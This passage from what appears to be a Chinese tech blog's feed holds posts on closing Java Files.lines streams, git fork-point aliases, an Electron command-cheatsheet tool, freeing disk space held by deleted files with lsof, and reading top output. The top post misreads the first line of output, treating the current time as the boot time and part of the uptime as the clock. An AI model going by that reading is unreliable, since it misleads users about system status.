class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Stream&lt;String&gt; <span class="title">lines</span><span class="params">(Path path, Charset cs)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader br = Files.newBufferedReader(path, cs);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> br.lines().onClose(asUncheckedRunnable(br));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error|RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                br.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    e.addSuppressed(ex);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点看这几句， </p>
<blockquote>
<p>The returned stream encapsulates a Reader.  If timely disposal of file system resources is required, the try-with-resources construct should be used to ensure that the stream’s <code>Stream#close</code> method is invoked  after the stream operations are completed.</p>
</blockquote>
<p>如果需要及时地清理系统的资源， 可以使用java7中引入的<code>try-with-resources</code>, 来确保<code>Stream</code>的<code>close</code>方法在使用完后被调用。</p>
<p><code>Files.lines</code>是惰性的， 当你使用的时候才去读取， 所以需要手动的关闭流， <code>Files.readAllLines</code>这个方法则是一次把文件<br>中的所有行读取到内存中去，并且会自动的关闭文件。</p>
<p><code>Files.readAllLines</code>的函数说明中就保证了底层的文件一定会被关闭。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Read all lines from a file. This method ensures that the file is</span></span><br><span class="line"><span class="comment">    * closed when all bytes have been read or an I/O error, or other runtime</span></span><br><span class="line"><span class="comment">    * exception, is thrown. Bytes from the file are decoded into characters</span></span><br><span class="line"><span class="comment">    * using the specified charset.</span></span><br><span class="line"><span class="comment">    **/</span></span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用java7中引入的<code>try-with-resoucres</code>, 实现了<code>AutoCloseable</code>接口的都会被自动的关闭</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> ( Stream&lt;String&gt; stream = Files.lines(path, charset) ) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://stackoverflow.com/questions/38698182/close-java-8-stream" rel="external nofollow noopener noreferrer" target="_blank">Close Java 8 Stream - Stack Overflow</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/37659872/do-i-have-to-close-terminated-streamed-query-results-in-a-try-with-resources-bl" rel="external nofollow noopener noreferrer" target="_blank">java - Do I have to close terminated, streamed query results in a try-with-resources-block? - Stack Overflow</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/latency2.html" rel="external nofollow noopener noreferrer" target="_blank">在你的代码之外，服务时延过长的三个追查方向(下) | 江南白衣</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git-checkout 常用命令]]></title>
      <url>http://qsli.github.io/2017/09/12/git-checkout/</url>
      <content type="html"><![CDATA[<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul>
<li>从另外一个分支检出文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout source_branch &lt;paths&gt;...</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://jasonrudolph.com/blog/2009/02/25/git-tip-how-to-merge-specific-files-from-another-branch/" rel="external nofollow noopener noreferrer" target="_blank">Git tip: How to “merge” specific files from another branch - jasonrudolph.com</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git查看已合并分支的fork点]]></title>
      <url>http://qsli.github.io/2017/09/12/git-branch-log/</url>
      <content type="html"><![CDATA[<h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><p>有些需求有好几期，做后面几期的可能完全不了解前几期做了什么，拿到分支号后，就需要找到最初的commit点。由于这个分支已经merge到了master上，所以找最近的ancestor就不对了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge-base branch1 branch2 //只能找到最近的祖先</span><br></pre></td></tr></table></figure>
<p>那么如何找到这个分支最初的fork点呢，下面给出两种方案，亲测有效。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="git-别名"><a href="#git-别名" class="headerlink" title="git 别名"></a>git 别名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global alias.oldest-ancestor <span class="string">'!zsh -c '</span>\<span class="string">''</span>diff -u &lt;(git rev-list --first-parent <span class="string">"<span class="variable">$&#123;1:-master&#125;</span>"</span>) &lt;(git rev-list --first-parent <span class="string">"<span class="variable">$&#123;2:-HEAD&#125;</span>"</span>) | sed -ne <span class="string">"s/^ //p"</span> | head -1<span class="string">'\'</span><span class="string">' -'</span></span><br><span class="line">git config --global alias.branchdiff <span class="string">'!sh -c "git diff `git oldest-ancestor`.."'</span></span><br><span class="line">git config --global alias.branchlog <span class="string">'!sh -c "git log `git oldest-ancestor`.."'</span></span><br></pre></td></tr></table></figure>
<p>上述三个命令就可以找到最初的commit点，以及这个分支做了什么。参见<code>stackoverflow</code>上的回答:  <a href="https://stackoverflow.com/questions/1527234/finding-a-branch-point-with-git" rel="external nofollow noopener noreferrer" target="_blank">Finding a branch point with Git? - Stack Overflow</a></p>
<h3 id="git分支图"><a href="#git分支图" class="headerlink" title="git分支图"></a>git分支图</h3><p>如果你使用<code>zsh</code>, 内置的有两个相关的命令<code>glgg</code>,<code>glgga</code>.</p>
<ul>
<li><code>glgg</code>： 显示当前分支的分支图</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="built_in">alias</span> glgg</span><br><span class="line">glgg=<span class="string">'git log --graph'</span></span><br></pre></td></tr></table></figure>
<img src="/2017/09/12/git-branch-log/glgg.png">
<ul>
<li><code>glgga</code>: 显示所有分支的分支图 </li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="built_in">alias</span> glgga</span><br><span class="line">glgga=<span class="string">'git log --graph --decorate --all'</span></span><br></pre></td></tr></table></figure>
<img src="/2017/09/12/git-branch-log/glgga.png">
<p>从分支图中可以快速的看出当前分支是在哪里fork出来的</p>
<h4 id="分支图的显示方式"><a href="#分支图的显示方式" class="headerlink" title="分支图的显示方式"></a>分支图的显示方式</h4><ul>
<li><p>reverse chronological： 默认显示方式，会按照commit的时间，逆序显示</p>
</li>
<li><p>topo order： 按照commit的拓扑顺序显示，子提交在父提交之前显示</p>
</li>
</ul>
<p>查看fork点的时候，最好是按照拓扑排序显示，这样分支图不会很乱，便于找到。</p>
<h3 id="可视化工具"><a href="#可视化工具" class="headerlink" title="可视化工具"></a>可视化工具</h3><p>可视化工具和git log的用法是一样的，顺着查找即可。这里我用<code>idea</code>为例：</p>
<img src="/2017/09/12/git-branch-log/idea.png">
<p>开启InteliSort后，注意红框勾上。</p>
<img src="/2017/09/12/git-branch-log/idea-sorted.png">
<p>开启后是按照提交排序的，并没有按照插入的时间，这样可以清楚的顺着提交找到最初的fork点。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://stackoverflow.com/questions/1527234/finding-a-branch-point-with-git" rel="external nofollow noopener noreferrer" target="_blank">Finding a branch point with Git? - Stack Overflow</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/chucklu/p/4748394.html" rel="external nofollow noopener noreferrer" target="_blank">git图示所有分支的历史 - ChuckLu - 博客园</a></p>
</li>
<li><p><a href="http://gitbook.liuhui998.com/3_4.html" rel="external nofollow noopener noreferrer" target="_blank">Git Book 中文版 - 查看历史 －Git日志</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> idea </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用electron开发自己的工具]]></title>
      <url>http://qsli.github.io/2017/09/10/electron/</url>
      <content type="html"><![CDATA[<h2 id="electron-简介"><a href="#electron-简介" class="headerlink" title="electron 简介"></a>electron 简介</h2><p>web是天生跨平台的。</p>
<p>前几年用ubuntu的时候，各种软件都没有相应的版本，十分的蛋疼。这几年随着web的发展，情况改善了许多。<br>比如说chrome的app， 安装好之后和原生的应用几乎没有区别，可以从ubuntu的dash里面搜索到，可以独立打开。</p>
<p><code>electron</code>则是直接整一个微型的chrome，加上html写的界面，直接做客户端。也有类似<code>atom</code>， <code>visual source code</code>等大型应用也是使用<code>electron</code>构建的。</p>
<img src="/2017/09/10/electron/electron.jpg">
<h2 id="简单的想法"><a href="#简单的想法" class="headerlink" title="简单的想法"></a>简单的想法</h2><p>之前在windows平台，使用的非常顺手的一个剪贴板增强工具——<a href="http://www.appinn.com/clibor/" rel="external nofollow noopener noreferrer" target="_blank">Clibor – 来自日本的剪贴板辅助工具[Win] - 小众软件</a>， 这个软件非常好用的一个功能就是支持<code>定型文</code>。所谓的<code>定型文</code>就是你事先录制好的一些常用的<br>条目，然后当你需要使用的时候，按快捷键呼出界面，选中想要的<code>定型文</code>，直接就给你复制到了剪贴板，十分的方便。</p>
<img src="/2017/09/10/electron/item.png">
<p>windows不爽的就是shell不好用， 虽然有<code>cygwin</code>,<code>babun</code>，<code>cmder</code>等还算不错的终端，但是用起来卡卡的，所以最终我还是迁移到了ubuntu，各种命令，各种爽。</p>
<p>但是，作为一个后端的开发，每天要上服务器上查各种问题，各种长长的命令，各种记不住，所以还是要有一个类似小抄试的工具来增强下工作效率。恰巧，上次在youtube上看electorn的一个视频——<a href="https://www.youtube.com/watch?v=FNHBfN8c32U" rel="external nofollow noopener noreferrer" target="_blank">Electron: Desktop Apps with Web Languages - GitHub Universe 2016 - YouTube</a>。这个视频大概介绍了electron，介绍了一些使用electron开发的有意思的应用， 恰巧我看到了一个叫做<code>mojibar</code>的简单应用。</p>
<img src="/2017/09/10/electron/mojibar.gif">
<p>她的这个应用是，搜索moji表情对应的文字， 然后会筛选出来相应的结果，然后复制到剪贴板上，支持快捷键呼出。看到这个就瞬间来了灵感，这和我要的小抄应用简直十分吻合。好在<code>electron</code>并不复杂，就研究了下代码自己改造了一番，于是就有了这篇文章。</p>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>这个demo基本可以在日常的工作中使用了， github的repo在——<a href="https://github.com/qsLI/quake-select" rel="external nofollow noopener noreferrer" target="_blank">qsLI/quake-select</a></p>
<p>下面是界面的截图：</p>
<img src="/2017/09/10/electron/select.png">
<p>配置文件在json中，类似下面的形式：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"commands"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"查看jvm堆的使用情况"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jmap -heap  `pgrep -f 'tomcat'`"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"查看jvm最终加载的开关"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"java -XX:+PrintFlagsFinal -version"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` VM.flags"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"查看jvm加载的系统变量"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` VM.system_properties"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: <span class="string">"查看本机jcmd支持的命令"</span>,</span><br><span class="line">      <span class="attr">"command"</span>: <span class="string">"sudo -u tomcat jcmd `pgrep -f tomcat` help"</span>,</span><br><span class="line">      <span class="attr">"tag"</span>: <span class="string">"opt"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目前支持按照<code>command</code>和<code>tag</code>搜索， mojibar使用的这个库在ubuntu下菜单会显示不出来，以后有时间再fix。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://electron.atom.io/" rel="external nofollow noopener noreferrer" target="_blank">Electron | Build cross platform desktop apps with JavaScript, HTML, and CSS.</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/20225295" rel="external nofollow noopener noreferrer" target="_blank">使用 Electron 构建桌面应用 - 知乎专栏</a></p>
</li>
<li><p><a href="http://www.appinn.com/clibor/" rel="external nofollow noopener noreferrer" target="_blank">Clibor – 来自日本的剪贴板辅助工具[Win] - 小众软件</a></p>
</li>
<li><p><a href="https://www.youtube.com/watch?v=FNHBfN8c32U" rel="external nofollow noopener noreferrer" target="_blank">Electron: Desktop Apps with Web Languages - GitHub Universe 2016 - YouTube</a></p>
</li>
<li><p><a href="https://github.com/muan/mojibar" rel="external nofollow noopener noreferrer" target="_blank">muan/mojibar: Emoji searcher but as a menubar app.</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> fe </category>
            
        </categories>
        
        
        <tags>
            
            <tag> electron </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux下删除文件]]></title>
      <url>http://qsli.github.io/2017/09/10/how-to-delete-file-correctly/</url>
      <content type="html"><![CDATA[<h1 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h1><img src="/2017/09/10/how-to-delete-file-correctly/inode.png" title="linux文件的存储">
<h2 id="软链接和硬链接"><a href="#软链接和硬链接" class="headerlink" title="软链接和硬链接"></a>软链接和硬链接</h2><p>软链接(Symbolic Link):</p>
<p>硬链接(Hard Link):</p>
<blockquote>
<p>硬链接就是在Directory中加入一条filename和Inode的对应关系，所以如果你删除了原来的文件，是不对硬链接文件有任何影响的，因为删除文件就是将link count 减少，当发现指向Inode为filename数量0的时候，系统会回收相应的Inode和Block空间。但是软链接就不同了，在Linux下所有的都是文件，所以软链接也有自己的Inode和block ，但是创建软链接不会在增加原文件Inode-Index，当删除原文件的时候，相应的Index不再能找到，所以导致软链接不能用。但是软链接有自身的优势，可以跨分区，这样就可以解决当前Inode数据区不足够写入，可以使用软链接指向空间充足的空间。</p>
</blockquote>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>软链接  硬链接 区别</p>
<img src="/2017/09/10/how-to-delete-file-correctly/links.png" title="软链接和硬链接的区别">
<h2 id="文件是否被占用"><a href="#文件是否被占用" class="headerlink" title="文件是否被占用"></a>文件是否被占用</h2><p>一切皆文件，所以lsof（list open file）就很重要</p>
<p>lsof -i ：8080 查看端口占用</p>
<p>socket 也是文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof  catalina.out</span><br><span class="line"></span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF     NODE NAME</span><br><span class="line">java    40916 tomcat    1w   REG    8,7   933679 27656540 catalina.out</span><br><span class="line">java    40916 tomcat    2w   REG    8,7   933679 27656540 catalina.out</span><br></pre></td></tr></table></figure>
<blockquote>
<p>‘‘REG’’ for a regular file<br>FD         is the File Descriptor number of the file or:</p>
</blockquote>
<pre><code>     cwd  current working directory;
     Lnn  library references (AIX);
     err  FD information error (see NAME column);
     jld  jail directory (FreeBSD);
     ltx  shared library text (code and data);
     Mxx  hex memory-mapped type number xx.
     m86  DOS Merge mapped file;
     mem  memory-mapped file;
     mmap memory-mapped device;
     pd   parent directory;
     rtd  root directory;
     tr   kernel trace file (OpenBSD);
     txt  program text (code and data);
     v86  VP/ix mapped file;

FD is followed by one of these characters, describing the mode under which the file is open:

     r for read access;
     w for write access;
     u for read and write access;
     space if mode unknown and no lock
          character follows;
     ‘-’ if mode unknown and lock
          character follows.
</code></pre><p>可以看出上面的文件的fd是1, w权限</p>
<p>系统，每个进程，文件描述符。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ls /proc/40916/fd</span><br></pre></td></tr></table></figure>
<p>下面的两个命令是等价的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/40916/fd/2</span><br><span class="line"></span><br><span class="line">sudo cat catalina.out</span><br></pre></td></tr></table></figure>
<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>删除文件之前应该先看下文件的占用情况，<code>lsof</code>可以查看到文件被哪个进程占用。</p>
<p>如果被占用，直接使用<code>rm</code>删除相当于只是删除了文件名和inode的关联, 但是文件占用的空间还在(block), 应该使用下面的命令进行删除：</p>
<blockquote>
<p>You misunderstand: deletion will be complete only after all processes using the file at the time of deletion have reached completion: only then the deleted inode will be returned to the pool of available inodes, and the content of the file may begin to be corrupted by over-writing. Until then, the inode is alive and well, and is pointing to the area of the disk containing the file in question. As soon as less completes, the soft link will disappear, and so will the file testing.txt.</p>
</blockquote>
<blockquote>
<pre><code>当我们使用rm命令的时候，系统并不会真正删除这个资料。除非有档案非要将资料存储在原来档案的这些block中。这样原来的block就会被新档案给覆盖掉。 
</code></pre></blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /dev/null &gt; filename</span><br><span class="line">或者</span><br><span class="line">truncate -s 0 filename</span><br></pre></td></tr></table></figure>
<h3 id="stat-命令"><a href="#stat-命令" class="headerlink" title="stat 命令"></a>stat 命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">stat</span> /proc/40916/fd/2</span><br><span class="line"></span><br><span class="line">File: `/proc/40916/fd/2<span class="string">' -&gt; `/home/q/www/qta.open.coupon.provider/logs/catalina.out'</span></span><br><span class="line">  Size: 64        	Blocks: 0          IO Block: 1024   symbolic link</span><br><span class="line">Device: 3h/3d	Inode: 3017464897  Links: 1</span><br><span class="line">Access: (0300/l-wx------)  Uid: (40001/  tomcat)   Gid: (40001/  tomcat)</span><br><span class="line">Access: 2017-07-05 05:05:06.318550652 +0800</span><br><span class="line">Modify: 2017-06-15 12:35:24.590599522 +0800</span><br><span class="line">Change: 2017-06-15 12:35:24.590599522 +0800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">stat</span> catalina.out</span><br><span class="line"></span><br><span class="line">File: `catalina.out<span class="string">'</span></span><br><span class="line"><span class="string">  Size: 962851    	Blocks: 1896       IO Block: 4096   regular file</span></span><br><span class="line"><span class="string">Device: 807h/2055d	Inode: 27656540    Links: 1</span></span><br><span class="line"><span class="string">Access: (0644/-rw-r--r--)  Uid: (40001/  tomcat)   Gid: (40001/  tomcat)</span></span><br><span class="line"><span class="string">Access: 2017-07-06 00:51:44.243427414 +0800</span></span><br><span class="line"><span class="string">Modify: 2017-07-06 00:52:27.096557541 +0800</span></span><br><span class="line"><span class="string">Change: 2017-07-06 00:52:27.096557541 +0800</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sudo ls -i /proc/40916/fd/2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3017464897 /proc/40916/fd/2</span></span><br></pre></td></tr></table></figure>
<p>可以看出, 文件描述符是一个软链接.</p>
<h3 id="目录下的文件占用空间很小-但是目录占用空间很大"><a href="#目录下的文件占用空间很小-但是目录占用空间很大" class="headerlink" title="目录下的文件占用空间很小, 但是目录占用空间很大"></a>目录下的文件占用空间很小, 但是目录占用空间很大</h3><p>这种情况, 最常见的就是文件被删除了, 但是还有进程占用它. 于是这个文件占用的block就没有释放掉.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof | grep deleted</span><br></pre></td></tr></table></figure>
<p>使用上面的命令就可以看到,那些文件被删除了, 但是还在被占用.  kill掉相应的进程, 空间就自己回来了.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/lsof.html" rel="external nofollow noopener noreferrer" target="_blank">3. lsof 一切皆文件 — Linux Tools Quick Tutorial</a></p>
</li>
<li><p><a href="https://unix.stackexchange.com/questions/92384/how-to-clean-log-file" rel="external nofollow noopener noreferrer" target="_blank">How to clean log file? - Unix &amp; Linux Stack Exchange</a></p>
</li>
<li><p><a href="https://unix.stackexchange.com/questions/88808/empty-the-contents-of-a-file" rel="external nofollow noopener noreferrer" target="_blank">shell script - Empty the contents of a file - Unix &amp; Linux Stack Exchange</a></p>
</li>
<li><p><a href="http://himichaelchu.iteye.com/blog/2116023" rel="external nofollow noopener noreferrer" target="_blank">通过Inode原理分析Linux中ln命令 - Michael Chu - ITeye技术网站</a></p>
</li>
<li><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html" rel="external nofollow noopener noreferrer" target="_blank">理解 Linux 的硬链接与软链接</a></p>
</li>
<li><p><a href="https://superuser.com/questions/1112781/why-do-symbolic-links-in-prox-pid-fd-act-as-hard-links" rel="external nofollow noopener noreferrer" target="_blank">linux - why do symbolic links in /prox/$PID/fd/ act as hard links? - Super User</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> lsof </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[top用法]]></title>
      <url>http://qsli.github.io/2017/09/09/top/</url>
      <content type="html"><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>top是了解系统状况最常用的命令，从top的输出我们可以很好的掌握系统的CPU, 内存，swap，进程的相关信息。</p>
<p>下面说下top的基本用法：</p>
<p><br><br></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ sudo top</span><br><span class="line"></span><br><span class="line">top - 15:19:54 up 200 days,  4:06,  1 user,  load average: 5.91, 6.14, 5.57</span><br><span class="line">Tasks: 499 total,   1 running, 498 sleeping,   0 stopped,   0 zombie</span><br><span class="line">Cpu(s): 20.1%us,  1.2%sy,  0.0%ni, 78.4%id,  0.0%wa,  0.0%hi,  0.4%si,  0.0%st</span><br><span class="line">Mem:  65979844k total, 65004736k used,   975108k free,     8108k buffers</span><br><span class="line">Swap: 50331644k total,    29364k used, 50302280k free,  5530672k cached</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                            </span><br><span class="line"> 8468 tomcat    20   0 71.2g  55g 6484 S 492.3 87.8  32033:12 java                                                                              </span><br><span class="line"> 1256 tomcat    20   0 6055m 251m 2504 S 24.9  0.4  41886:22 java                                                                               </span><br><span class="line"> 2446 root      20   0 15304 1568  928 R  0.7  0.0   0:00.11 top                                                                                </span><br><span class="line">30593 root      20   0  526m  31m 3208 S  0.3  0.0   0:15.41 salt-minion                                                                        </span><br><span class="line">    1 root      20   0 19232  632  384 S  0.0  0.0  11:49.23 init                                                                               </span><br><span class="line">    2 root      20   0     0    0    0 S  0.0  0.0   0:00.32 kthreadd                                                                           </span><br><span class="line">    3 root      RT   0     0    0    0 S  0.0  0.0   2:55.22 migration/0                                                                        </span><br><span class="line">    4 root      20   0     0    0    0 S  0.0  0.0   5:49.74 ksoftirqd/0                                                                        </span><br><span class="line">    5 root      RT   0     0    0    0 S  0.0  0.0   0:00.00 stopper/0</span><br></pre></td></tr></table></figure>
<h3 id="系统概况"><a href="#系统概况" class="headerlink" title="系统概况"></a>系统概况</h3><p> 从输出的第一行来看， 首先是系统的uptime信息(使用<code>uptime</code>也可以查看)， 可以看到系统已经运行了200天了，是在<code>15：19：54</code>这个时间点启动起来的， <code>4：06</code> 是当前的时间， 当前只有一个用户登录(使用<code>w</code>也可以查看当前的登录用户)。 还有就是系统的负载——load average，这个有三个值，分别是1分钟的平均负载， 5分钟的， 15分钟的（<code>uptime</code>的输出信息中也有这个）。</p>
<p> 第二行包含了系统进程的一些统计信息，Tasks是运行队列中的任务个数（Linux run-queue）， 还有一些其他状态的进程的个数信息</p>
<blockquote>
<ul>
<li><strong>running</strong>:  CPU 上运行的和将要被调度运行的；</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>sleeping</strong>: 通常是等待事件(比如 IO 操作)完成的任务，细分可以包括 interruptible 和 uninterruptible 的类型；</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>stopped</strong>: 是一些被暂停的任务，通常发送 SIGSTOP 或者对一个前台任务操作 Ctrl-Z 可以将其暂停；</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>zombie</strong>: 僵尸任务，虽然进程终止资源会被自动回收，但是含有退出任务的 task descriptor 需要父进程访问后才能释放，这种进程显示为 <code>defunct</code> 状态，无论是因为父进程提前退出还是未 wait 调用，出现这种进程都应该格外注意程序是否设计有误。</li>
</ul>
</blockquote>
<h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p> 第三行是CPU的一些信息，各个部分的占用都很明确。</p>
<blockquote>
<ul>
<li>(us) user：CPU 在低 nice 值(高优先级)用户态所占用的时间(nice&lt;=0)。正常情况下只要服务器不是很闲，那么大部分的 CPU 时间应该都在此执行这类程序</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(sy) system：CPU 处于内核态所占用的时间，操作系统通过系统调用(system call)从用户态陷入内核态，以执行特定的服务；通常情况下该值会比较小，但是当服务器执行的 IO 比较密集的时候，该值会比较大</li>
</ul>
